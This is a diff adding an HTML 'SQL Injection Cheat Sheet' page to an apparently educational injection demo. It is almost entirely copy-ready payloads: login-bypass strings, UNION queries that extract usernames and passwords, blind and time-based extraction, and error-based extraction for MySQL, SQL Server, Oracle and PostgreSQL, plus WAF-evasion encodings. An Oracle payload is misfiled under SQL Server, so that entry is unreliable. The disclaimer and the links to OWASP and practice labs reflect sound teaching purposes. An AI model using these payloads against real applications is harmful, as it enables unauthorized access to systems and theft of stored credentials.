@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection Cheat Sheet - SQL Injection Demo</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { padding: 20px; }
+        .container { max-width: 1000px; }
+        pre { background-color: #f5f5f5; padding: 10px; border-radius: 5px; overflow-x: auto; margin-bottom: 0; }
+        .card { margin-bottom: 20px; }
+        .nav-pills .nav-link.active { background-color: #0d6efd; }
+        h4 { margin-top: 20px; }
+        .copy-button {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="navigation mb-4">
+            <a href="index.html" class="btn btn-outline-secondary">&larr; Back to Index</a>
+        </div>
+        
+        <h1>SQL Injection Cheat Sheet</h1>
+        <div class="alert alert-danger mb-4">
+            <strong>Educational Purposes Only!</strong> This cheat sheet is provided for educational purposes to understand SQL injection vulnerabilities. Using these techniques without permission is illegal and unethical.
+        </div>
+        
+        <div class="row">
+            <div class="col-md-3">
+                <div class="card sticky-top" style="top: 20px;">
+                    <div class="card-header">
+                        <h5 class="mb-0">Contents</h5>
+                    </div>
+                    <div class="card-body p-0">
+                        <nav class="nav nav-pills flex-column p-3">
+                            <a class="nav-link active" href="#detection">Detection Techniques</a>
+                            <a class="nav-link" href="#authentication">Authentication Bypass</a>
+                            <a class="nav-link" href="#union">UNION Attacks</a>
+                            <a class="nav-link" href="#blind">Blind Injection</a>
+                            <a class="nav-link" href="#error">Error-Based Extraction</a>
+                            <a class="nav-link" href="#database">Database-Specific</a>
+                            <a class="nav-link" href="#waf">WAF Bypass Techniques</a>
+                            <a class="nav-link" href="#tools">Tools & Resources</a>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-9">
+                <section id="detection" class="mb-5">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="mb-0">Detection Techniques</h3>
+                        </div>
+                        <div class="card-body">
+                            <p>First step in SQL injection is testing if a parameter is vulnerable:</p>
+                            
+                            <h4>Testing for String Parameters</h4>
+                            <div class="position-relative">
+                                <pre>'
+"
+')'
+")"
+';
+";
+-- -
+#</pre>
+                            </div>
+                            
+                            <h4>Testing for Numeric Parameters</h4>
+                            <div class="position-relative">
+                                <pre>1-0
+1+0
+1-1
+1/0
+0/0</pre>
+                            </div>
+                            
+                            <h4>Testing with Boolean Operations</h4>
+                            <div class="position-relative">
+                                <pre>1 OR 1=1
+1 AND 1=1
+1 AND 1=2
+1 OR 'x'='x'
+1 AND 'x'='y'</pre>
+                            </div>
+                            
+                            <h4>Identifying Error Messages</h4>
+                            <p>Error messages can reveal database type and vulnerability:</p>
+                            <div class="position-relative">
+                                <pre>MySQL: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...
+SQL Server: Microsoft SQL Native Client error '80040e14'...
+Oracle: ORA-00933: SQL command not properly ended
+PostgreSQL: ERROR: syntax error at or near...</pre>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="authentication" class="mb-5">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="mb-0">Authentication Bypass</h3>
+                        </div>
+                        <div class="card-body">
+                            <p>Payloads to bypass login forms:</p>
+                            
+                            <h4>Basic Authentication Bypass</h4>
+                            <div class="position-relative">
+                                <pre>' OR '1'='1
+' OR '1'='1' -- -
+' OR '1'='1' #
+' OR 1=1 -- -
+" OR 1=1 -- -
+or 1=1--
+' OR 'x'='x
+" OR "x"="x
+') OR ('x'='x
+admin' -- -
+admin' #
+admin'/*
+admin' or '1'='1
+admin" or "1"="1</pre>
+                            </div>
+                            
+                            <h4>Using SQL Functions</h4>
+                            <div class="position-relative">
+                                <pre>' OR length('a')=1 -- -
+' OR 1 LIKE 1 -- -
+' OR substr('password',1,1)='p' -- -</pre>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="union" class="mb-5">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="mb-0">UNION Attacks</h3>
+                        </div>
+                        <div class="card-body">
+                            <p>UNION-based techniques for extracting data from other tables:</p>
+                            
+                            <h4>Determining Column Count</h4>
+                            <div class="position-relative">
+                                <pre>' ORDER BY 1 -- -
+' ORDER BY 2 -- -
+' ORDER BY 3 -- -
+' UNION SELECT NULL -- -
+' UNION SELECT NULL,NULL -- -
+' UNION SELECT NULL,NULL,NULL -- -</pre>
+                            </div>
+                            
+                            <h4>Testing Column Data Types</h4>
+                            <div class="position-relative">
+                                <pre>' UNION SELECT 'a',NULL,NULL -- -
+' UNION SELECT NULL,1,NULL -- -
+' UNION SELECT NULL,NULL,1.1 -- -</pre>
+                            </div>
+                            
+                            <h4>Extracting Data</h4>
+                            <div class="position-relative">
+                                <pre>' UNION SELECT username,password,NULL FROM users -- -
+' UNION SELECT table_name,column_name,data_type FROM information_schema.columns -- -
+' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U' -- - (SQL Server)
+' UNION SELECT 1,version(),3 -- -
+' UNION SELECT 1,database(),3 -- -
+' UNION SELECT 1,user(),3 -- -</pre>
+                            </div>
+                            
+                            <h4>Getting Database Structure</h4>
+                            <div class="position-relative">
+                                <pre>// For MySQL and PostgreSQL:
+' UNION SELECT table_name,column_name,1 FROM information_schema.columns WHERE table_schema=database() -- -
+
+// For Oracle:
+' UNION SELECT table_name,column_name,1 FROM all_tab_columns -- -
+
+// For SQL Server:
+' UNION SELECT table_name,column_name,1 FROM information_schema.columns -- -</pre>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="blind" class="mb-5">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="mb-0">Blind SQL Injection</h3>
+                        </div>
+                        <div class="card-body">
+                            <p>Techniques for extracting data when results are not directly visible:</p>
+                            
+                            <h4>Boolean-Based Blind Injection</h4>
+                            <div class="position-relative">
+                                <pre>1 AND 1=1
+1 AND 1=2
+1 AND (SELECT COUNT(*) FROM users) > 0
+1 AND (SELECT COUNT(*) FROM information_schema.tables) > 10
+1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'
+1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97
+1 AND (SELECT username FROM users WHERE username='admin' AND LENGTH(password)>5)</pre>
+                            </div>
+                            
+                            <h4>Time-Based Blind Injection</h4>
+                            <div class="position-relative">
+                                <pre>// MySQL
+1 AND SLEEP(5)
+1 AND IF(1=1,SLEEP(5),0)
+1 AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)
+1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)
+
+// PostgreSQL
+1 AND (SELECT pg_sleep(5))
+1 AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)
+
+// SQL Server
+1 AND WAITFOR DELAY '0:0:5'
+1 AND IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '0:0:5'
+
+// Oracle
+1 AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=0
+1 AND 1=(CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) ELSE 0 END)</pre>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="error" class="mb-5">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="mb-0">Error-Based Data Extraction</h3>
+                        </div>
+                        <div class="card-body">
+                            <p>Using database error messages to extract information:</p>
+                            
+                            <h4>MySQL Error-Based Extraction</h4>
+                            <div class="position-relative">
+                                <pre>AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
+AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))
+AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)
+AND (1=1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@version),0x3a,FLOOR(RAND(0)*2)) FROM information_schema.tables GROUP BY CONCAT(@@version,FLOOR(RAND(0)*2))))</pre>
+                            </div>
+                            
+                            <h4>SQL Server Error-Based Extraction</h4>
+                            <div class="position-relative">
+                                <pre>AND 1=convert(int,(select @@version))
+AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))
+AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))
+AND 1=convert(int,(SELECT TOP 1 CONCAT(name,':',password) FROM users))</pre>
+                            </div>
+                            
+                            <h4>Oracle Error-Based Extraction</h4>
+                            <div class="position-relative">
+                                <pre>AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))
+AND 1=to_number(DBMS_XMLGEN.GETXML('SELECT username FROM all_users WHERE rownum=1'))
+AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||REPLACE(REPLACE(REPLACE((SELECT user FROM dual),CHR(38),CHR(38)||CHR(38)),CHR(60),CHR(38)||CHR(35)||CHR(54)||CHR(48)||CHR(59)),CHR(62),CHR(38)||CHR(35)||CHR(54)||CHR(50)||CHR(59))||CHR(62))) FROM dual)</pre>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="database" class="mb-5">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="mb-0">Database-Specific Payloads</h3>
+                        </div>
+                        <div class="card-body">
+                            <div class="accordion" id="databaseAccordion">
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header" id="mysqlHeader">
+                                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#mysqlPayloads" aria-expanded="true" aria-controls="mysqlPayloads">
+                                            MySQL
+                                        </button>
+                                    </h2>
+                                    <div id="mysqlPayloads" class="accordion-collapse collapse show" aria-labelledby="mysqlHeader">
+                                        <div class="accordion-body">
+                                            <h4>Database Information</h4>
+                                            <div class="position-relative">
+                                                <pre>SELECT @@version
+SELECT version()
+SELECT database()
+SELECT user()
+SELECT current_user()
+SELECT system_user()
+SELECT session_user()</pre>
+                                            </div>
+                                            
+                                            <h4>Schema Information</h4>
+                                            <div class="position-relative">
+                                                <pre>SELECT table_name FROM information_schema.tables
+SELECT column_name FROM information_schema.columns WHERE table_name='users'
+SELECT table_schema FROM information_schema.tables</pre>
+                                            </div>
+                                            
+                                            <h4>String Operations</h4>
+                                            <div class="position-relative">
+                                                <pre>SELECT CONCAT('a','b','c')
+SELECT CHAR(65,66,67)
+SELECT ASCII('A')
+SELECT HEX('hello')
+SELECT SUBSTRING('hello',1,3)</pre>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header" id="sqlserverHeader">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#sqlserverPayloads" aria-expanded="false" aria-controls="sqlserverPayloads">
+                                            SQL Server
+                                        </button>
+                                    </h2>
+                                    <div id="sqlserverPayloads" class="accordion-collapse collapse" aria-labelledby="sqlserverHeader">
+                                        <div class="accordion-body">
+                                            <h4>Database Information</h4>
+                                            <div class="position-relative">
+                                                <pre>SELECT @@version
+SELECT DB_NAME()
+SELECT USER_NAME()
+SELECT SYSTEM_USER
+SELECT CURRENT_USER</pre>
+                                            </div>
+                                            
+                                            <h4>Schema Information</h4>
+                                            <div class="position-relative">
+                                                <pre>SELECT name FROM sysobjects WHERE xtype='U'
+SELECT name FROM syscolumns WHERE id=object_id('users')
+SELECT name FROM master..sysdatabases</pre>
+                                            </div>
+                                            
+                                            <h4>String Operations</h4>
+                                            <div class="position-relative">
+                                                <pre>SELECT 'a'+'b'+'c'
+SELECT CHAR(65)+CHAR(66)+CHAR(67)
+SELECT ASCII('A')
+SELECT CONVERT(VARCHAR, 0x68656c6c6f)
+SELECT SUBSTRING('hello',1,3)</pre>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header" id="oracleHeader">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#oraclePayloads" aria-expanded="false" aria-controls="oraclePayloads">
+                                            Oracle
+                                        </button>
+                                    </h2>
+                                    <div id="oraclePayloads" class="accordion-collapse collapse" aria-labelledby="oracleHeader">
+                                        <div class="accordion-body">
+                                            <h4>Database Information</h4>
+                                            <div class="position-relative">
+                                                <pre>SELECT banner FROM v$version WHERE ROWNUM=1
+SELECT SYS.DATABASE_NAME FROM DUAL
+SELECT USER FROM DUAL
+SELECT CURRENT_USER FROM DUAL</pre>
+                                            </div>
+                                            
+                                            <h4>Schema Information</h4>
+                                            <div class="position-relative">
+                                                <pre>SELECT table_name FROM all_tables
+SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
+SELECT owner, table_name FROM all_tables</pre>
+                                            </div>
+                                            
+                                            <h4>String Operations</h4>
+                                            <div class="position-relative">
+                                                <pre>SELECT 'a'||'b'||'c' FROM DUAL
+SELECT CHR(65)||CHR(66)||CHR(67) FROM DUAL
+SELECT ASCII('A') FROM DUAL
+SELECT SUBSTR('hello',1,3) FROM DUAL</pre>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="waf" class="mb-5">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="mb-0">WAF Bypass Techniques</h3>
+                        </div>
+                        <div class="card-body">
+                            <p>Methods to bypass Web Application Firewall protections:</p>
+                            
+                            <h4>Alternative Encodings</h4>
+                            <div class="position-relative">
+                                <pre>// URL Encoding
+%55%4E%49%4F%4E %53%45%4C%45%43%54 1,2,3-- -
+
+// Double URL Encoding
+%2555%254E%2549%254F%254E %2553%2545%254C%2545%2543%2554 1,2,3-- -
+
+// Unicode Encoding
+%u0055%u004E%u0049%u004F%u004E %u0053%u0045%u004C%u0045%u0043%u0054 1,2,3-- -
+
+// Hex Encoding
+UNION char(83)+char(69)+char(76)+char(69)+char(67)+char(84) 1,2,3-- -</pre>
+                            </div>
+                            
+                            <h4>Using Whitespace Alternatives</h4>
+                            <div class="position-relative">
+                                <pre>// Comments instead of spaces
+UNION/**/SELECT/**/1,2,3-- -
+
+// Line breaks
+UNION%0ASELECT%0A1,2,3-- -
+
+// Tabs
+UNION%09SELECT%091,2,3-- -
+
+// Other characters that may work as spaces
+UNION[TAB]SELECT[TAB]1,2,3-- -</pre>
+                            </div>
+                            
+                            <h4>Case Variation</h4>
+                            <div class="position-relative">
+                                <pre>UnIoN SeLeCt 1,2,3-- -
+union select 1,2,3-- -
+UNION SELECT 1,2,3-- -</pre>
+                            </div>
+                            
+                            <h4>SQL Comments</h4>
+                            <div class="position-relative">
+                                <pre>U/**/NI/**/ON SE/**/LECT 1,2,3-- -
+UN/*!50000ION*/ SEL/*!50000ECT*/ 1,2,3-- -
+UN/**//*50000*/ION SEL/**//*50000*/ECT 1,2,3-- -</pre>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="tools" class="mb-5">
+                    <div class="card">
+                        <div class="card-header">
+                            <h3 class="mb-0">Tools & Resources</h3>
+                        </div>
+                        <div class="card-body">
+                            <h4>Automated SQL Injection Tools</h4>
+                            <ul>
+                                <li><strong>SQLmap</strong> - Advanced open source SQL injection tool (<a href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a>)</li>
+                                <li><strong>SQLninja</strong> - SQL Server specific injection tool</li>
+                                <li><strong>NoSQLmap</strong> - For NoSQL database injection testing</li>
+                                <li><strong>Havij</strong> - Automated SQL injection tool</li>
+                            </ul>
+                            
+                            <h4>Online Resources</h4>
+                            <ul>
+                                <li><strong>OWASP SQL Injection Prevention Cheat Sheet</strong> (<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">Link</a>)</li>
+                                <li><strong>PortSwigger SQL Injection Guide</strong> (<a href="https://portswigger.net/web-security/sql-injection" target="_blank">Link</a>)</li>
+                                <li><strong>PayloadsAllTheThings SQL Injection List</strong> (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank">Link</a>)</li>
+                            </ul>
+                            
+                            <h4>Practice Platforms</h4>
+                            <ul>
+                                <li><strong>PortSwigger Web Security Academy</strong> - Free interactive SQL injection labs</li>
+                                <li><strong>OWASP WebGoat</strong> - Deliberately insecure web application for learning</li>
+                                <li><strong>SQLZoo</strong> - Interactive SQL tutorial with injection exercises</li>
+                                <li><strong>TryHackMe</strong> - Various SQL injection rooms and paths</li>
+                            </ul>
+                        </div>
+                    </div>
+                </section>
+            </div>
+        </div>
+        
+        <div class="card mt-4">
+            <div class="card-header">Important Note</div>
+            <div class="card-body">
+                <p>This cheat sheet simulates SQL injection techniques without affecting your real database. No actual database is being accessed. These techniques are documented purely for educational purposes.</p>
+                <p>Remember that unauthorized SQL injection testing or attacks are illegal and unethical. Always obtain proper permission before testing for vulnerabilities on any system.</p>
+            </div>
+        </div>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Activate the correct nav pill based on scroll position
+        window.addEventListener('DOMContentLoaded', function() {
+            const sections = document.querySelectorAll('section');
+            const navLinks = document.querySelectorAll('.nav-link');
+            
+            window.addEventListener('scroll', function() {
+                let current = '';
+                
+                sections.forEach(section => {
+                    const sectionTop = section.offsetTop;
+                    const sectionHeight = section.clientHeight;
+                    if (pageYOffset >= (sectionTop - 150)) {
+                        current = section.getAttribute('id');
+                    }
+                });
+                
+                navLinks.forEach(link => {
+                    link.classList.remove('active');
+                    if (link.getAttribute('href').substring(1) === current) {
+                        link.classList.add('active');
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
